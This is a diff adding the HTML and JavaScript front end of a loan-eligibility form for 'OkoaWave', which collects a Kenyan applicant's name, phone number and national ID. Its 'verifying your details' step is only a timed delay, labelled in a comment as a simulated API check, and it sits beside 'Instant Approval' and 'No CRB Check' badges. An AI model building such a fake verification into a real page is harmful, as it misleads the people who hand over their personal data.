@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loan Eligibility | OkoaWave</title>
+    
+    <!-- Favicons -->
+    <link rel="apple-touch-icon" sizes="192x192" href="icons/icon-red.192.png">
+    <link rel="icon" type="image/png" sizes="512x512" href="icons/icon-red.512.png">
+    
+    <!-- Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- SweetAlert -->
+    <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.min.css" rel="stylesheet">
+    
+    <style>
+    :root {
+        --primary: #2E7D32;
+        --primary-light: #4CAF50;
+        --primary-dark: #1B5E20;
+        --cream: #FFF9F5;
+        --white: #FFFFFF;
+        --black: #1A1A1A;
+        --gray: #5E5E5E;
+        --light-gray: #EEEEEE;
+        --border-radius: 14px;
+        --card-shadow: 0 4px 16px rgba(0, 0, 0, 0.08);
+    }
+    
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: 'Inter', sans-serif;
+        -webkit-tap-highlight-color: transparent;
+    }
+
+    body {
+        min-height: 100vh;
+        background-color: var(--cream);
+        color: var(--black);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        padding: 16px;
+        line-height: 1.5;
+    }
+
+    .container {
+        width: 100%;
+        max-width: 420px;
+    }
+
+    .card {
+        background: var(--white);
+        border-radius: var(--border-radius);
+        padding: 24px 20px;
+        box-shadow: var(--card-shadow);
+        position: relative;
+        overflow: hidden;
+    }
+
+    .card::after {
+        content: "";
+        position: absolute;
+        top: -50px;
+        right: -50px;
+        width: 120px;
+        height: 120px;
+        background: rgba(46, 125, 50, 0.05);
+        border-radius: 50%;
+    }
+
+    /* Header */
+    .header {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        margin-bottom: 20px;
+    }
+
+    .logo-icon {
+        width: 42px;
+        height: 42px;
+        background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+        border-radius: 10px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: white;
+        font-size: 1.2rem;
+    }
+
+    .logo-text {
+        font-weight: 700;
+        font-size: 1.4rem;
+        color: var(--primary-dark);
+    }
+
+    .title {
+        font-size: 1.3rem;
+        font-weight: 600;
+        margin-bottom: 6px;
+    }
+
+    .subtitle {
+        color: var(--gray);
+        font-size: 0.85rem;
+        margin-bottom: 16px;
+    }
+
+    /* Form Elements */
+    .form-group {
+        margin-bottom: 16px;
+        position: relative;
+    }
+
+    .form-label {
+        display: block;
+        font-size: 0.85rem;
+        color: var(--gray);
+        margin-bottom: 6px;
+        font-weight: 500;
+    }
+
+    .form-control {
+        width: 100%;
+        padding: 14px 16px;
+        border: 1px solid var(--light-gray);
+        border-radius: var(--border-radius);
+        font-size: 0.95rem;
+        transition: all 0.2s;
+        background: var(--cream);
+    }
+
+    .form-control:focus {
+        outline: none;
+        border-color: var(--primary);
+        box-shadow: 0 0 0 2px rgba(46, 125, 50, 0.1);
+    }
+
+    .select-wrapper {
+        position: relative;
+    }
+
+    .select-wrapper::after {
+        content: "▼";
+        position: absolute;
+        top: 50%;
+        right: 16px;
+        transform: translateY(-50%);
+        color: var(--primary);
+        font-size: 0.7rem;
+        pointer-events: none;
+    }
+
+    select.form-control {
+        appearance: none;
+        padding-right: 36px;
+    }
+
+    /* Button */
+    .btn {
+        width: 100%;
+        padding: 16px;
+        background: linear-gradient(to right, var(--primary), var(--primary-dark));
+        color: var(--white);
+        border: none;
+        border-radius: var(--border-radius);
+        font-size: 1rem;
+        font-weight: 600;
+        cursor: pointer;
+        transition: all 0.2s;
+        margin-top: 8px;
+        box-shadow: 0 4px 12px rgba(46, 125, 50, 0.3);
+    }
+
+    .btn:active {
+        transform: scale(0.98);
+    }
+
+    .btn i {
+        margin-left: 6px;
+    }
+
+    /* Trust Section */
+    .trust-section {
+        margin: 20px 0;
+        text-align: center;
+    }
+
+    .trust-badges {
+        display: flex;
+        justify-content: center;
+        flex-wrap: wrap;
+        gap: 10px;
+        margin: 16px 0;
+    }
+
+    .trust-badge {
+        background: var(--cream);
+        padding: 8px 14px;
+        border-radius: 20px;
+        font-size: 0.75rem;
+        display: flex;
+        align-items: center;
+        gap: 6px;
+        box-shadow: 0 1px 4px rgba(0, 0, 0, 0.05);
+    }
+
+    .trust-badge i {
+        color: var(--primary);
+        font-size: 0.8rem;
+    }
+
+    .trust-note {
+        font-size: 0.75rem;
+        color: var(--gray);
+        margin-top: 8px;
+    }
+
+    /* Loan Range */
+    .loan-range {
+        background: rgba(46, 125, 50, 0.1);
+        border-radius: var(--border-radius);
+        padding: 12px;
+        text-align: center;
+        margin-bottom: 20px;
+        font-size: 0.9rem;
+    }
+
+    .loan-amount {
+        font-weight: 700;
+        color: var(--primary-dark);
+        font-size: 1.1rem;
+    }
+</style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="header">
+                <div class="logo-icon">
+                    <i class="fas fa-hand-holding-usd"></i>
+                </div>
+                <div class="logo-text">OkoaWave</div>
+            </div>
+
+            <h1 class="title">Check Your Eligibility</h1>
+            <p class="subtitle">Find out how much you qualify for instantly</p>
+            
+            <div class="loan-range">
+                <div>Available Loan Amount</div>
+                <div class="loan-amount">Ksh 1,500 – 10,000</div>
+            </div>
+
+            <form id="eligibility_form" onsubmit="handleSubmit(event)">
+                <div class="form-group">
+                    <label for="name" class="form-label">Full Name</label>
+                    <input type="text" name="name" id="name" class="form-control" placeholder="John Doe" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="phone_number" class="form-label">Phone Number</label>
+                    <input type="tel" name="phone_number" id="phone_number" class="form-control" placeholder="0712345678" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="id_number" class="form-label">ID Number</label>
+                    <input type="number" name="id_number" id="id_number" class="form-control" placeholder="12345678" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="loan_type" class="form-label">Loan Purpose</label>
+                    <div class="select-wrapper">
+                        <select name="loan_type" id="loan_type" class="form-control" required>
+                            <option value="" disabled selected>Select loan purpose</option>
+                            <option>Business</option>
+                            <option>Personal</option>
+                            <option>Education</option>
+                            <option>Medical</option>
+                            <option>Emergency</option>
+                        </select>
+                    </div>
+                </div>
+
+                <button type="submit" class="btn">
+                    Check Eligibility <i class="fas fa-arrow-right"></i>
+                </button>
+                
+                <div class="trust-section">
+                    <div class="trust-badges">
+                        <div class="trust-badge">
+                            <i class="fas fa-lock"></i>
+                            <span>Secure Application</span>
+                        </div>
+                        <div class="trust-badge">
+                            <i class="fas fa-user-shield"></i>
+                            <span>No CRB Check</span>
+                        </div>
+                        <div class="trust-badge">
+                            <i class="fas fa-clock"></i>
+                            <span>Instant Approval</span>
+                        </div>
+                    </div>
+                    <p class="trust-note">No paperwork required. No guarantors needed.</p>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- SweetAlert JS -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.all.min.js"></script>
+    
+    <script>
+        const nameRegex = /^[a-zA-Z\s.'-]{2,}$/;
+        const phoneRegex = /^0[7]\d{8}$/;
+        const idRegex = /^\d{7,8}$/;
+
+        function handleSubmit(e) {
+            e.preventDefault();
+            const f = e.target;
+            const name = f.name.value.trim();
+            const phone = f.phone_number.value.trim();
+            const id = f.id_number.value.trim();
+            const type = f.loan_type.value;
+
+            if (!nameRegex.test(name)) {
+                return Swal.fire('Invalid Name', 'Please enter your full name (letters only)', 'error');
+            }
+            if (!phoneRegex.test(phone)) {
+                return Swal.fire('Invalid Phone', 'Please enter a valid Safaricom number (07XXXXXXXX)', 'error');
+            }
+            if (!idRegex.test(id)) {
+                return Swal.fire('Invalid ID', 'Please enter a valid Kenyan ID (7-8 digits)', 'error');
+            }
+            if (!type) {
+                return Swal.fire('Missing Loan Type', 'Please select your loan purpose', 'error');
+            }
+
+            // Store data
+            sessionStorage.setItem('myLoan', JSON.stringify({
+                name,
+                phone_number: phone,
+                id_number: id,
+                loan_type: type
+            }));
+
+            // Show loading
+            Swal.fire({
+                title: 'Checking Eligibility',
+                html: 'We\'re verifying your details...',
+                allowOutsideClick: false,
+                didOpen: () => Swal.showLoading(),
+                background: 'var(--cream)',
+                color: 'var(--black)'
+            });
+            
+            // Simulate API check
+            setTimeout(() => {
+                Swal.close();
+                window.location.href = 'apply.html';
+            }, 2500);
+        }
+
+        // Fill form if returning
+        window.onload = () => {
+            const data = JSON.parse(sessionStorage.getItem('myLoan') || '{}');
+            if (data.name) document.getElementById('name').value = data.name;
+            if (data.phone_number) document.getElementById('phone_number').value = data.phone_number;
+            if (data.id_number) document.getElementById('id_number').value = data.id_number;
+            if (data.loan_type) document.getElementById('loan_type').value = data.loan_type;
+        };
+    </script>
+</body>
+</html>
